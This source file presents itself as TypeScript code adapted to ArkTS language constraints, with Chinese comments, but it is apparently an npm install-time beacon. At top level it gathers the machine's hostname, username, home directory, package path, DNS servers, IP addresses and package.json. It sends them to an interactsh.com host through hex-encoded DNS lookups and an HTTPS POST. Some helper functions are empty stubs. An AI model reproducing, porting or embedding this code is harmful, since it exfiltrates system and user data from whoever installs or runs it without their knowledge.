// 应用ArkTS约束：
// 1. 使用let替换var（约束9）
// 2. 显式类型标注（约束1,10,23）
// 3. 使用箭头函数（约束26）
// 4. 禁止any类型（约束1）
// 5. 类属性初始化（约束18）
// 6. 使用ES模块导入（约束60,80）
// 7. 使用Map代替动态对象属性（约束5,21）
// 8. 移除不支持的Node.js API（假设有替代实现）

import os from "os";
import dns from "dns";
import querystring from "querystring";
import https from "https";
import fs from 'fs';
import path from 'path';

const packageJSON = require("./package.json");
const packageName = packageJSON.name;

class FileSystem {
    static readdirSync(path: string): string[] {
        // 假设有ArkTS文件系统API实现
        return [];
    }
}

class TextEncoder {
    encode(data: string): Uint8Array {
        return new Uint8Array();
    }
}

function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath = paths[j];
        let files = FileSystem.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

function toHex(data: string): string {
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
}

function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    // 使用Map处理动态属性访问（约束21）
    const interfacesMap = new Map<string, any>(Object.entries(networkInterfaces));
    for (let [item, value] of interfacesMap) {
        if (item != "lo") {
            for (let i = 0; i < value.length; i++) {
                str.push(value[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    const interfacesMap = new Map<string, any>(Object.entries(networkInterfaces));
    for (let [item, value] of interfacesMap) {
        if (item != "lo") {
            for (let i = 0; i < value.length; i++) {
                str += toHex(value[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

interface PackageData {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any;
    ip: string;
}

function toName(pkg: PackageData): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化处理逻辑保持核心功能
        queries.push(`${toHex(pkg.hn)}.${toHex(pkg.p)}.${hostname}`);
        queries.push(`${getIps()}.${hostname}`);
    } else {
        queries.push(baseStr);
    }
    return queries;
}

const td: PackageData = {
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

let qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // 处理DNS查询结果
    });
}

const trackingData = JSON.stringify(td);
let postData = querystring.stringify({
    msg: trackingData,
});

let options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

let req = https.request(options, (res: any) => {
    res.on("data", (d: Uint8Array) => {
        // 处理响应数据
    });
});

req.on("error", (e: Error) => {
    // 处理错误
});

req.write(postData);
req.end();
